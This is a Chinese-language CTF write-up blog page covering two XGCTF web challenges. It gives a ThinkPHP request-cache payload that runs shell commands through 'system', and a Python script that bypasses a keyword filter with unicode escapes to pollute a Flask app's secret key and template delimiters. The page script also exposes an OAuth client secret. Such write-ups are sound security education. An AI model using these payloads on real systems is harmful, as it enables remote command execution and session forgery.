@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>XGCTF - WEB - Writeup | fallingskies</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://fallingskies22.github.io/favicon.ico?v=1724150366542">
+<link rel="stylesheet" href="https://fallingskies22.github.io/styles/main.css">
+
+
+  
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
+  
+
+  
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="tpdoor
+框架为ThinkPHP
+&lt;?php
+
+namespace app\controller;
+
+use app\BaseController;
+use think\facade\Db;
+
+class Index extend..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://fallingskies22.github.io">
+        <img src="https://fallingskies22.github.io/images/avatar.png?v=1724150366542" class="site-logo">
+        <h1 class="site-title">fallingskies</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/post/friends" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      <h3>想要去月球<h3>
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://fallingskies22.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">XGCTF - WEB - Writeup</h2>
+            <div class="post-date">2024-07-17</div>
+            
+            <div class="post-content" v-pre>
+              <h2 id="tpdoor">tpdoor</h2>
+<p>框架为ThinkPHP</p>
+<pre><code class="language-php">&lt;?php
+
+namespace app\controller;
+
+use app\BaseController;
+use think\facade\Db;
+
+class Index extends BaseController
+{
+    protected $middleware = ['think\middleware\AllowCrossDomain','think\middleware\CheckRequestCache','think\middleware\LoadLangPack','think\middleware\SessionInit'];
+    public function index($isCache = false , $cacheTime = 3600)
+    {
+        
+        if($isCache == true){
+            $config = require  __DIR__.'/../../config/route.php';
+            $config['request_cache_key'] = $isCache;
+            $config['request_cache_expire'] = intval($cacheTime);
+            $config['request_cache_except'] = [];
+            file_put_contents(__DIR__.'/../../config/route.php', '&lt;?php return '. var_export($config, true). ';');
+            return 'cache is enabled';
+        }else{
+            return 'Welcome ,cache is disabled';
+        }
+    }
+}
+</code></pre>
+<p>isCache值可控即request_cache_key值可控。<br>
+考察请求缓存的相关知识，参考https://www.kancloud.cn/manual/thinkphp6_0/1037524</p>
+<p>/vendor/topthink/framework/src/think/middleware/CheckRequestCache.php</p>
+<pre><code class="language-php">&lt;?php
+/**
+     * 读取当前地址的请求缓存信息
+     * @access protected
+     * @param Request $request
+     * @param mixed   $key
+     * @return null|string
+     */
+    protected function parseCacheKey($request, $key)
+    {
+        if ($key instanceof Closure) {
+            $key = call_user_func($key, $request);
+        }
+
+        if (false === $key) {
+            // 关闭当前缓存
+            return;
+        }
+
+        if (true === $key) {
+            // 自动缓存功能
+            $key = '__URL__';
+        } elseif (str_contains($key, '|')) {
+            [$key, $fun] = explode('|', $key); //这里对key进行了分割
+        }
+
+        // 特殊规则替换
+        if (str_contains($key, '__')) {
+            $key = str_replace(['__CONTROLLER__', '__ACTION__', '__URL__'], [$request-&gt;controller(), $request-&gt;action(), md5($request-&gt;url(true))], $key);
+        }
+
+        if (str_contains($key, ':')) {
+            $param = $request-&gt;param();
+
+            foreach ($param as $item =&gt; $val) {
+                if (is_string($val) &amp;&amp; str_contains($key, ':' . $item)) {
+                    $key = str_replace(':' . $item, (string) $val, $key);
+                }
+            }
+        } elseif (str_contains($key, ']')) {
+            if ('[' . $request-&gt;ext() . ']' == $key) {
+                // 缓存某个后缀的请求
+                $key = md5($request-&gt;url());
+            } else {
+                return;
+            }
+        }
+
+        if (isset($fun)) {
+            $key = $fun($key); //这里直接裸奔了，无任何过滤
+        }
+
+        return $key;
+    }
+</code></pre>
+<p>使用<br>
+payload</p>
+<pre><code>?isCache=cat%20/*|system
+</code></pre>
+<p>访问第二次时触发缓存就会执行命令，但下一次执行其他命令就需要等到缓存消除即3600秒。</p>
+<h2 id="easy_polluted">easy_polluted</h2>
+<p>参考文章：https://blog.jacki.cn/2024/07/07/ctfshow-xgctf/#web</p>
+<p>app.py</p>
+<pre><code class="language-py">from flask import Flask, session, redirect, url_for,request,render_template
+import os
+import hashlib
+import json
+import re
+def generate_random_md5():
+    random_string = os.urandom(16)
+    md5_hash = hashlib.md5(random_string)
+
+    return md5_hash.hexdigest()
+def filter(user_input):
+    blacklisted_patterns = ['init', 'global', 'env', 'app', '_', 'string']
+    for pattern in blacklisted_patterns:
+        if re.search(pattern, user_input, re.IGNORECASE):
+            return True
+    return False
+def merge(src, dst):
+    # Recursive merge function
+    for k, v in src.items():
+        if hasattr(dst, '__getitem__'):
+            if dst.get(k) and type(v) == dict:
+                merge(v, dst.get(k))
+            else:
+                dst[k] = v
+        elif hasattr(dst, k) and type(v) == dict:
+            merge(v, getattr(dst, k))
+        else:
+            setattr(dst, k, v)
+
+
+app = Flask(__name__)
+app.secret_key = generate_random_md5()
+
+class evil():
+    def __init__(self):
+        pass
+
+@app.route('/',methods=['POST'])
+def index():
+    username = request.form.get('username')
+    password = request.form.get('password')
+    session[&quot;username&quot;] = username
+    session[&quot;password&quot;] = password
+    Evil = evil()
+    if request.data:
+        if filter(str(request.data)):
+            return &quot;NO POLLUTED!!!YOU NEED TO GO HOME TO SLEEP~&quot;
+        else:
+            merge(json.loads(request.data), Evil)
+            return &quot;MYBE YOU SHOULD GO /ADMIN TO SEE WHAT HAPPENED&quot;
+    return render_template(&quot;index.html&quot;)
+
+@app.route('/admin',methods=['POST', 'GET'])
+def templates():
+    username = session.get(&quot;username&quot;, None)
+    password = session.get(&quot;password&quot;, None)
+    if username and password:
+        if username == &quot;adminer&quot; and password == app.secret_key:
+            return render_template(&quot;flag.html&quot;, flag=open(&quot;/flag&quot;, &quot;rt&quot;).read())
+        else:
+            return &quot;Unauthorized&quot;
+    else:
+        return f'Hello,  This is the POLLUTED page.'
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000)
+</code></pre>
+<p>利用merge参数来进行原型链污染，修改app.secret，以及模板语法来解析flag。</p>
+<p>secret_key 的路径为 <strong>init</strong>.<em>globals</em>.app.secret_key</p>
+<p>模版语法 的路径为 <strong>init</strong>.<em>globals</em>.app.jinja_env.variable_start_string 和 variable_end_string</p>
+<pre><code class="language-py">import requests
+import json
+
+def poc_1(session, url):
+    headers = {
+        'Content-Type':'application/json'
+    }
+    res = session.post(url=url, headers=headers, data=json.dumps({
+        r&quot;\u005F\u005F\u0069nit\u005F\u005F&quot;: {
+            r&quot;\u005F\u005F\u0067lobals\u005F\u005F&quot;: {
+                r&quot;\u0061pp&quot;: {
+                    &quot;config&quot;: {
+                        r&quot;SECRET\u005FKEY&quot;: &quot;123&quot;
+                    }
+                }
+            }
+        }
+    }), proxies={'http':'http://127.0.0.1:8080'})
+    return res.text
+
+def poc_2(session, url):
+    headers = {
+        'Content-Type':'application/json'
+    }
+    res = session.post(url=url, headers=headers, data=json.dumps({
+        r&quot;\u005F\u005F\u0069nit\u005F\u005F&quot;: {
+            r&quot;\u005F\u005F\u0067lobals\u005F\u005F&quot;: {
+                r&quot;\u0061pp&quot;: {
+                    r&quot;jinja\u005F\u0065nv&quot;: {
+                        r&quot;variable\u005Fstart\u005F\u0073tring&quot;: &quot;[#&quot;,
+                        r&quot;variable\u005Fend\u005F\u0073tring&quot;: &quot;#]&quot;
+                    }
+                }
+            }
+        }
+    }), proxies={'http':'http://127.0.0.1:8080'})
+    return res.text
+
+def poc_admin(session, url):
+    url = url + &quot;/admin&quot;
+    headers = {
+        'Cookie': 'session=eyJwYXNzd29yZCI6IjEyMyIsInVzZXJuYW1lIjoiYWRtaW5lciJ9.ZpuAjA.JqS6L3KEVXx-pz3e3hFIDp_8wJ8'
+    }
+    res = session.post(url=url, headers=headers, data=json.dumps({
+        r&quot;\u005F\u005F\u0069nit\u005F\u005F&quot;: {
+            r&quot;\u005F\u005F\u0067lobals\u005F\u005F&quot;: {
+                r&quot;\u0061pp&quot;: {
+                    r&quot;jinja\u005F\u0065nv&quot;: {
+                        r&quot;variable\u005Fstart\u005F\u0073tring&quot;: &quot;[#&quot;,
+                        r&quot;variable\u005Fend\u005F\u0073tring&quot;: &quot;#]&quot;
+                    }
+                }
+            }
+        }
+    }), proxies={'http':'http://127.0.0.1:8080'})
+    return res 
+
+if __name__ == '__main__':
+    url = &quot;http://0ef6feea-2f36-45f4-99b0-f3c0184bafdb.challenge.ctf.show/&quot;
+    session = requests.Session()
+    result1 = poc_1(session, url)
+    print(result1)
+    result2 = poc_2(session, url)
+    print(result2)
+    flag = poc_admin(session, url)
+    print(flag.text)
+</code></pre>
+<p>使用unicode来绕过关键字过滤。</p>
+<p>这个脚本发包时会出现<code>\\</code>，这里手动去除多余的<code>\</code>再使用bp发包。</p>
+<p>最后访问admin时的jwt可以手动生成，也可以post传参username和password，服务端会返回Cookie。</p>
+<p>获取flag (如果在修改模版语法前请求了/admin, 因为模板已经渲染了 无发显示flag 重启环境 先污染再请求/admin)</p>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://fallingskies22.github.io/post/ctfshowcms/">
+                  <h3 class="post-title">
+                    [ctfshow]CMS
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+              
+                <div id="gitalk-container" data-aos="fade-in"></div>
+              
+
+              
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+  
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+
+      var gitalk = new Gitalk({
+        clientID: '1b08861b8ad19018640e',
+        clientSecret: '1881a7245597aa70e1ffc8412e5b6c1eb0ad7241',
+        repo: 'fallingskies22.github.io',
+        owner: 'fallingskies22',
+        admin: ['fallingskies22'],
+        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+      })
+
+      gitalk.render('gitalk-container')
+
+    </script>
+  
+
+  
+
+
+
+
+  </body>
+</html>
